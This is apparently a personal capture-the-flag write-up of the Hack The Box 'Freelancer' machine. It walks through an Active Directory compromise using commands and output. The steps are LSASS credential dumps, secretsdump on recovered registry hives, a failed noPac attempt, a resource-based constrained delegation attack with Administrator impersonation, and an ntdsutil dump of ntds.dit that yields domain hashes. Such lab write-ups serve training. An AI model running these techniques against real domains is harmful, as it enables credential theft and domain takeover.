     * Password : a6 80 a4 af 30 e0 45 06 64 19 c6 f5 2c 07 3d 73 82 41 fa 9d 1c ff 59 1b 95 15 35 cf f5 32 0b 10 9e 65 22 0c 1c 9e 4f a8 91 c9 d1 ee 22 e9 90 c4 76 6b 3e b6 3f b3 e2 da 67 eb d1 98 30 d4 5c 0b a4 e6 e6 df 93 18 0c 0a 74 49 75 06 55 ed d7 8e b8 48 f7 57 68 9a 68 89 f3 f8 f7 f6 cf 53 e1 19 6a 52 8a 7c d1 05 a2 ec ce fb 2a 17 ae 5a eb f8 49 02 e3 26 6b bc 5d b6 e3 71 62 7b b0 82 8c 2a 36 4c b0 11 19 cf 3d 2c 70 d9 20 32 8c 81 4c ad 07 f2 b5 16 14 3d 86 d0 e8 8e f1 50 40 67 81 5e d7 0e 9c cb 86 1f 57 39 4d 94 ba 9f 77 19 8e 9d 76 ec ad f8 cd b1 af da 48 b8 1f 81 d8 4a c6 25 30 38 9c b6 4d 41 2b 78 4f 0f 73 35 51 a6 2e c0 86 2a c2 fb 26 1b 43 d7 99 90 d4 e2 bf bf 4d 7d 4e eb 90 cc d7 dc 9b 48 20 28 c2 14 3c 5a 60 10 
     * Key List
       aes256_hmac       9cc4c2603a3ed67348ee18025dc10cdea94e9427fc4f6e02fca57f1eb89dead7
       aes128_hmac       e2166c1e1a5f29f378c4751039869624
       rc4_hmac_nt       1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old      1003ddfa0a470017188b719e1eaae709
       rc4_md4           1003ddfa0a470017188b719e1eaae709
       rc4_hmac_nt_exp   1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old_exp  1003ddfa0a470017188b719e1eaae709

    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 26144 (00000000:00006620)
Session           : UndefinedLogonType from 0
User Name         : 
Domain            : 
Logon Server      : 
Logon Time        : 2023-10-04 19:30:07
SID               : 
    msv : 
     [00000003] Primary
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * NTLM     : 1003ddfa0a470017188b719e1eaae709
     * SHA1     : 4ce0bf0f488248a0858d1eacbe75529994ba4999
    tspkg : KO
    wdigest : KO
    kerberos : KO
    ssp : 
    masterkey : 
    credman : 

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DATACENTER-2019$
Domain            : FREELANCER
Logon Server      : 
Logon Time        : 2023-10-04 19:30:07
SID               : S-1-5-18
    msv : 
    tspkg : KO
    wdigest : 
     * Username : DATACENTER-2019$
     * Domain   : FREELANCER
     * Password : (null)
    kerberos : 
     * Username : datacenter-2019$
     * Domain   : FREELANCER.HTB
     * Password : (null)
     * Key List
       aes256_hmac       6e4859faf9de3d1de33fdd2a0bb4591306b5d64f0d8ec2de342d49cf470cbc1f
       rc4_hmac_nt       1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old      1003ddfa0a470017188b719e1eaae709
       rc4_md4           1003ddfa0a470017188b719e1eaae709
       rc4_hmac_nt_exp   1003ddfa0a470017188b719e1eaae709
       rc4_hmac_old_exp  1003ddfa0a470017188b719e1eaae709

    ssp : 
    masterkey : 
     [00000000]
     * GUID      :	{bb43c14f-ceb3-4470-849a-af15c76aac4a}
     * Time      :	2023-10-04 17:30:33
     * MasterKey :	182ec41e8b2b2b36200887fe41dfc5f71b73c2b619ec79c0510056b4bf777e151f31d18a435b5d91aeaf7db6be46c278ed315b68dd6c318b5745f9c5bf9473e3
     [00000001]
     * GUID      :	{981d16b3-c818-4a7e-82fe-1206e42b6c72}
     * Time      :	2023-10-04 17:32:17
     * MasterKey :	d8201d9b1dd265a4c7f8a69a808d8755c9912c386feb6bf379e08d41cdb6d26b749dda3e31c0a538139c564263769cd4deb6c274b0b9d16d2a301a4d72d7d50c
     [00000002]
     * GUID      :	{57db84cf-ea9c-45a1-a6e8-d618821e181e}
     * Time      :	2023-10-04 17:30:10
     * MasterKey :	95e2ae7fd5c84c8e5bb19665661286fc54c6dec7ebe820ce1a74e359374f4f75f6c3275333be7ad14931a238ce64708f6160af90ba0ae2f82b4d653a6a96132e
     [00000003]
     * GUID      :	{1d1cfc42-9fc7-49bb-b834-9e0600d6e152}
     * Time      :	2023-10-04 17:30:08
     * MasterKey :	ca76b946db6b85cbe497c531122ca25d333e0e5aa7d5a6251c420d9816f2583fafac661734d33edd00e1ffb1bd273403583e82a085a78d75f29bac7bb6fc4401
    credman :
```

From this can we find another password:

**v3ryS0l!dP@sswd#29**

**PWN3D#l0rr@Armessa199**

Can we password spray now?

# Attempt #3

Talking to another dude seems like the password extracted from LSASS.exe of the old admin is totally non-sense!

So the key here is to use https://github.com/evild3ad/MemProcFS-Analyzer

This will map the dump to a disk and beeing able to extract the SAM file from it!

![35933ccaedce1c4fea1b97b4715ec716.png](../../../_resources/35933ccaedce1c4fea1b97b4715ec716.png)

And now we have the mounted disk, straight to the reg hives!

![5da5a8bc2ae61134a47ff8152324407d.png](../../../_resources/5da5a8bc2ae61134a47ff8152324407d.png)

Now I tried to parse the hived with 3rd party tools like Registry explorer but I get a lot of jibberish so I will copy to linux and hope I can use those with secretsdump instead?

And now we have the missing point:

```
┌──(root㉿kali-bello)-[/home/…/Downloads/Freelancer/Dump/hive_files]
└─# impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
[*] Dumping cached domain logon information (domain/username:hash)
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
[*] NL$KM 
 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &.........z.I.C.
 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c 
NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
[*] _SC_MSSQL$DATA 
(Unknown User):PWN3D#l0rr@Armessa199
[*] Cleaning up...
```

With that password saved under secrets, now We can use that do gain access as Lorra199 via Winrm and upload the Sharphound for AD enumeration.

![5c3eb0f0457fb583164cb7ca00ee95ea.png](../../../_resources/5c3eb0f0457fb583164cb7ca00ee95ea.png)

Now we need to run Sharph![b797ce4dc47c3c59ab65217a64aa0a26.png](../../../_resources/b797ce4dc47c3c59ab65217a64aa0a26.png)Checking her permisisions we can see she is part of an AD group that can create GPOs?

![f952537c944bcd38fe167a2259be0a45.png](../../../_resources/f952537c944bcd38fe167a2259be0a45.png)

This can be used so far!

https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#gpo-abuse

Now since I guess we will have some troubles with Defender this might be a good candidate?

https://github.com/Hackndo/pyGPOAbuse

But we can also see that She can add herself to the IT Technician group?

![de5498a664177062eb065b55c7e855c9.png](../../../_resources/de5498a664177062eb065b55c7e855c9.png)

&nbsp;

# Attempt #4

Now the foruth time I am attempting this challenge since I didn't have much time this week...

Without further do let's resume what we know so far about LORRA199's AD permissions.

- She is part of a AD Recycle Bin group which should allow us to check for deleted items in the recycle bin
- She can add herself to IT Technician groups?
- The BIN Recycle group have GenericWrite permisssion over a GPO Owner group which allows her to add herself to it. This might allow us to execute a SharpGPO attack?
- Lastly we have seen that Lorra199 might be able to add computers to AD, but at the time the permissions were disabled..

&nbsp;

I will start by uploading Powerview.ps1 to the machine to be able to work with AD.

![2637f4c2f821ef800f33774597dd6f5a.png](../../../_resources/2637f4c2f821ef800f33774597dd6f5a.png)

Bu the defender is messing it up!

![4bdba918f85fa88db600b6db9d1e21da.png](../../../_resources/4bdba918f85fa88db600b6db9d1e21da.png)

So using instead the Active directory module allows us to check the BIN but it isn't holding much that is interesting...

```
*Evil-WinRM* PS C:\temp> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\temp> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *


CanonicalName                   : freelancer.htb/Deleted Objects
CN                              : Deleted Objects
Created                         : 8/23/2023 9:45:55 PM
createTimeStamp                 : 8/23/2023 9:45:55 PM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 10/19/2023 7:03:45 PM
modifyTimeStamp                 : 10/19/2023 7:03:45 PM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=freelancer,DC=htb
ObjectClass                     : container
ObjectGUID                      : bb081f2b-bd0a-4fc7-b3e9-50e107e961ee
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 262288
uSNCreated                      : 5659
whenChanged                     : 10/19/2023 7:03:45 PM
whenCreated                     : 8/23/2023 9:45:55 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/Emily Johnson
                                  DEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6
CN                              : Emily Johnson
                                  DEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6
codePage                        : 0
countryCode                     : 0
Created                         : 10/11/2023 9:35:12 PM
createTimeStamp                 : 10/11/2023 9:35:12 PM
Deleted                         : True
Description                     : Incident Responder
DisplayName                     :
DistinguishedName               : CN=Emily Johnson\0ADEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {10/12/2023 3:20:27 AM, 12/31/1600 7:00:00 PM}
givenName                       : Emily
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
memberOf                        : {CN=Event Log Readers,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Log Users,CN=Builtin,DC=freelancer,DC=htb, CN=Performance Monitor Users,CN=Builtin,DC=freelancer,DC=htb}
Modified                        : 1/2/2024 3:21:43 AM
modifyTimeStamp                 : 1/2/2024 3:21:43 AM
msDS-LastKnownRDN               : Emily Johnson
Name                            : Emily Johnson
                                  DEL:0c78ea5f-c198-48da-b5fa-b8554a02f3b6
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 0c78ea5f-c198-48da-b5fa-b8554a02f3b6
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-1125
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133415481121389460
sAMAccountName                  : ejohnson
sDRightsEffective               : 0
sn                              : Johnson
userAccountControl              : 66048
userPrincipalName               : ejohnson@freelancer.htb
uSNChanged                      : 200873
uSNCreated                      : 192612
whenChanged                     : 1/2/2024 3:21:43 AM
whenCreated                     : 10/11/2023 9:35:12 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/James Moore
                                  DEL:8194e0a3-b636-4dba-91de-317dfe34f5b5
CN                              : James Moore
                                  DEL:8194e0a3-b636-4dba-91de-317dfe34f5b5
codePage                        : 0
countryCode                     : 0
Created                         : 10/11/2023 11:05:56 PM
createTimeStamp                 : 10/11/2023 11:05:56 PM
Deleted                         : True
Description                     : WSGI Manager
DisplayName                     :
DistinguishedName               : CN=James Moore\0ADEL:8194e0a3-b636-4dba-91de-317dfe34f5b5,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {11/2/2023 1:13:01 AM, 12/31/1600 7:00:00 PM}
givenName                       : James
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
memberOf                        : {CN=Domain Admins,CN=Users,DC=freelancer,DC=htb}
Modified                        : 1/22/2024 2:34:44 AM
modifyTimeStamp                 : 1/22/2024 2:34:44 AM
msDS-LastKnownRDN               : James Moore
Name                            : James Moore
                                  DEL:8194e0a3-b636-4dba-91de-317dfe34f5b5
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 8194e0a3-b636-4dba-91de-317dfe34f5b5
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133415535561235386
sAMAccountName                  : jmoore
sDRightsEffective               : 0
sn                              : Moore
userAccountControl              : 66048
userPrincipalName               : jmoore@freelancer.htb
uSNChanged                      : 200762
uSNCreated                      : 192706
whenChanged                     : 1/22/2024 2:34:44 AM
whenCreated                     : 10/11/2023 11:05:56 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/Abigail Morris
                                  DEL:80104541-085f-4686-b0a2-26a0cbd7c23c
CN                              : Abigail Morris
                                  DEL:80104541-085f-4686-b0a2-26a0cbd7c23c
codePage                        : 0
countryCode                     : 0
Created                         : 10/11/2023 11:44:50 PM
createTimeStamp                 : 10/11/2023 11:44:50 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Abigail Morris\0ADEL:80104541-085f-4686-b0a2-26a0cbd7c23c,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {11/2/2023 1:13:01 AM, 12/31/1600 7:00:00 PM}
givenName                       : Abigail
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
managedObjects                  : {CN=Workstation3-WIN11,CN=Computers,DC=freelancer,DC=htb}
Modified                        : 1/2/2024 3:22:47 AM
modifyTimeStamp                 : 1/2/2024 3:22:47 AM
msDS-LastKnownRDN               : Abigail Morris
Name                            : Abigail Morris
                                  DEL:80104541-085f-4686-b0a2-26a0cbd7c23c
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 80104541-085f-4686-b0a2-26a0cbd7c23c
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-1147
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133415558908762212
sAMAccountName                  : abigail.morris
sDRightsEffective               : 0
sn                              : Morris
userAccountControl              : 66048
userPrincipalName               : abigail.morris@freelancer.htb
uSNChanged                      : 200875
uSNCreated                      : 192809
whenChanged                     : 1/2/2024 3:22:47 AM
whenCreated                     : 10/11/2023 11:44:50 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/Noah Baker
                                  DEL:d955e3c2-6ff5-4b66-8971-2caa60ea72c7
CN                              : Noah Baker
                                  DEL:d955e3c2-6ff5-4b66-8971-2caa60ea72c7
codePage                        : 0
countryCode                     : 0
Created                         : 10/12/2023 12:03:14 AM
createTimeStamp                 : 10/12/2023 12:03:14 AM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Noah Baker\0ADEL:d955e3c2-6ff5-4b66-8971-2caa60ea72c7,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {10/12/2023 3:20:30 AM, 12/31/1600 7:00:00 PM}
givenName                       : Noah
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 12/20/2023 3:21:13 AM
modifyTimeStamp                 : 12/20/2023 3:21:13 AM
msDS-LastKnownRDN               : Noah Baker
Name                            : Noah Baker
                                  DEL:d955e3c2-6ff5-4b66-8971-2caa60ea72c7
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : d955e3c2-6ff5-4b66-8971-2caa60ea72c7
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-1148
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133415569941760163
sAMAccountName                  : noah.baker
sDRightsEffective               : 0
sn                              : Baker
userAccountControl              : 66048
userPrincipalName               : noah.baker@freelancer.htb
uSNChanged                      : 200871
uSNCreated                      : 192816
whenChanged                     : 12/20/2023 3:21:13 AM
whenCreated                     : 10/12/2023 12:03:14 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/tony stark
                                  DEL:e7027ba5-1921-488f-b4d8-58d7dac4aca9
CN                              : tony stark
                                  DEL:e7027ba5-1921-488f-b4d8-58d7dac4aca9
codePage                        : 0
countryCode                     : 0
Created                         : 10/11/2023 4:16:55 AM
createTimeStamp                 : 10/11/2023 4:16:55 AM
Deleted                         : True
Description                     : Active Directory Engineer & IT Support
DisplayName                     :
DistinguishedName               : CN=tony stark\0ADEL:e7027ba5-1921-488f-b4d8-58d7dac4aca9,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
givenName                       : tony
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
memberOf                        : {CN=IT Technicians,CN=Users,DC=freelancer,DC=htb, CN=Backup Operators,CN=Builtin,DC=freelancer,DC=htb}
Modified                        : 2/1/2024 4:18:56 AM
modifyTimeStamp                 : 2/1/2024 4:18:56 AM
msDS-LastKnownRDN               : tony stark
Name                            : tony stark
                                  DEL:e7027ba5-1921-488f-b4d8-58d7dac4aca9
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : e7027ba5-1921-488f-b4d8-58d7dac4aca9
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-1163
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133414858160219605
sAMAccountName                  : sstark
sDRightsEffective               : 0
sn                              : stark
userAccountControl              : 66048
userPrincipalName               : sstark@freelancer.htb
uSNChanged                      : 200937
uSNCreated                      : 200921
whenChanged                     : 2/1/2024 4:18:56 AM
whenCreated                     : 10/11/2023 4:16:55 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/Liza Kazanof
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
CN                              : Liza Kazanof
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
codePage                        : 0
countryCode                     : 0
Created                         : 5/14/2024 6:37:29 PM
createTimeStamp                 : 5/14/2024 6:37:29 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Liza Kazanof\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
givenName                       : Liza
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
mail                            : liza.kazanof@freelancer.htb
memberOf                        : {CN=Remote Management Users,CN=Builtin,DC=freelancer,DC=htb, CN=Backup Operators,CN=Builtin,DC=freelancer,DC=htb}
Modified                        : 5/14/2024 6:41:44 PM
modifyTimeStamp                 : 5/14/2024 6:41:44 PM
msDS-LastKnownRDN               : Liza Kazanof
Name                            : Liza Kazanof
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : ebe15df5-e265-45ec-b7fc-359877217138
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-2101
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133601998496583593
sAMAccountName                  : liza.kazanof
sDRightsEffective               : 0
sn                              : Kazanof
userAccountControl              : 512
userPrincipalName               : liza.kazanof@freelancer.com
uSNChanged                      : 544913
uSNCreated                      : 540822
whenChanged                     : 5/14/2024 6:41:44 PM
whenCreated                     : 5/14/2024 6:37:29 PM
```

next checking for permissions seems like LORRA now can add workstations to AD?  
![6306f7061e53b5755e190ad42ddadb71.png](../../../_resources/6306f7061e53b5755e190ad42ddadb71.png)

So my idea here is to check if we can run noPAC? https://github.com/Ridter/noPac  
<br/>

![311db1b331fc562e54c60cee56b2a9bf.png](../../../_resources/311db1b331fc562e54c60cee56b2a9bf.png)

Seems like our time zones don't match we need to update it so times match...

```
*Evil-WinRM* PS C:\temp> Get-Date

Thursday, June 6, 2024 8:19:00 AM


*Evil-WinRM* PS C:\temp>
```

We need to put our time one hour back to match the one from the machine... But it still fails so I will match my time to the NTP server from the challenge!

https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

![7ac4b493fff229e378d5f14e0a5770c9.png](../../../_resources/7ac4b493fff229e378d5f14e0a5770c9.png)

And now we should be ready to go?  
![01a0ba20a827e72df366ab2c7c02c88b.png](../../../_resources/01a0ba20a827e72df366ab2c7c02c88b.png)

As you see we got a machine quota=10 which means we can add up to 10 machines to domain.

We got back a TGT which is the way to go, otherwise wouldn't work.

Now I am confident we can move on and impersonate administrator on the machine :D  
<br/>

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Exploits/noPac]
└─# python3 noPac.py freelancer.htb/lorra199:"PWN3D#l0rr@Armessa199" -dc-ip 10.10.11.5 -dc-host dc -shell --impersonate administrator -use-ldap


███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target DC.freelancer.htb
[*] will try to impersonate administrator
[*] Adding Computer Account "WIN-USJECSKIQDB$"
[*] MachineAccount "WIN-USJECSKIQDB$" password = tNL#UzACeaQp
[*] Successfully added machine account WIN-USJECSKIQDB$ with password tNL#UzACeaQp.
[*] WIN-USJECSKIQDB$ object = CN=WIN-USJECSKIQDB,CN=Computers,DC=freelancer,DC=htb
[-] Cannot rename the machine account , Reason 00000523: SysErr: DSID-031A1242, problem 22 (Invalid argument), data 0

[*] Attempting to del a computer with the name: WIN-USJECSKIQDB$
[*] Delete computer WIN-USJECSKIQDB$ successfully!
```

But you see a strange error... DAMN! This might mean that the noPAC have been patched?

We need to use RBCD attacks instead...  https://medium.com/@Dpsypher/proving-grounds-practice-resourced-b3a50d40664b

&nbsp;

First I need to add a new dummy PC to AD:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Freelancer]
└─# impacket-addcomputer freelancer.htb/lorra199:"PWN3D#l0rr@Armessa199" -dc-ip 10.10.11.5 -computer-name 'YOVECIO$' -computer-pass 'Coglione1!'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account YOVECIO$ with password Coglione1!.
```

Next we need to allow delegation on the freshly created dummy computer object.

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Exploits/rbcd-attack]
└─# python3 rbcd.py -dc-ip 10.10.11.5 -t "DC" -f "YOVECIO" freelancer.htb\\lorra199:"PWN3D#l0rr@Armessa199" 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Starting Resource Based Constrained Delegation Attack against DC$
[*] Initializing LDAP connection to 10.10.11.5
[*] Using freelancer.htb\lorra199 account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `YOVECIO` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `DC`
[*] Delegation rights modified succesfully!
[*] YOVECIO$ can now impersonate users on DC$ via S4U2Proxy
```

Next we need to ask for a TGT that will be used with option -k in impacketer to gain access to the machine via kerberos ticket.

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Freelancer]
└─# impacket-getST -spn cifs/dc.freelancer.htb freelancer.htb/yovecio\$:'Coglione1!' -impersonate Administrator -dc-ip 10.10.11.5
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
```

Now we need to point the session to this kerberos ticket.

![a1de2d57093a0f50d73cce9179030e47.png](../../../_resources/a1de2d57093a0f50d73cce9179030e47.png)

And lastly we should be able to use the session kerberos ticket to connect from linux!

![84df5ef9ec6ba94d6958f30513e1301a.png](../../../_resources/84df5ef9ec6ba94d6958f30513e1301a.png)

But we can't access the Administrator anyway, so I guess we need to dump the ntds.dit and take it further!

![fa63abda29865d7eb214a17619a9bd0b.png](../../../_resources/fa63abda29865d7eb214a17619a9bd0b.png)

We can dump the ntds.dit by using the ntds.exe native utility tool.

```
:\WINDOWS\system32>powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
C:\WINDOWS\system32\ntdsutil.exe: ac i ntds
Active instance set to "ntds".
C:\WINDOWS\system32\ntdsutil.exe: ifm
ifm: create full c:\temp
Creating snapshot...
Snapshot set {cb021cea-c078-4ec5-a8b4-3bed52b62011} generated successfully.
Snapshot {7db628f3-8d73-4a04-bea0-aad7d16c3f6c} mounted as C:\$SNAP_202406060926_VOLUMEC$\
Snapshot {7db628f3-8d73-4a04-bea0-aad7d16c3f6c} is already mounted.
Initiating DEFRAGMENTATION mode...
     Source Database: C:\$SNAP_202406060926_VOLUMEC$\Windows\NTDS\ntds.dit
     Target Database: c:\temp\Active Directory\ntds.dit

                  Defragmentation  Status (omplete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

Copying registry files...
Copying c:\temp\registry\SYSTEM
Copying c:\temp\registry\SECURITY
Snapshot {7db628f3-8d73-4a04-bea0-aad7d16c3f6c} unmounted.
IFM media created successfully in c:\temp
ifm: q
C:\WINDOWS\system32\ntdsutil.exe: q
```

Now with the stable session under Evil-WINRM we can download the files as parse locally!

![57cf624183c8f8acc866e588e8f94158.png](../../../_resources/57cf624183c8f8acc866e588e8f94158.png)

And same we need for SYSTEM and SECURITY hives!

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Freelancer]
└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local -just-dc-ntlm
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x9db1404806f026092ec95ba23ead445b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 69f0afd7f9c47bac4a83dded01eb9dea
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
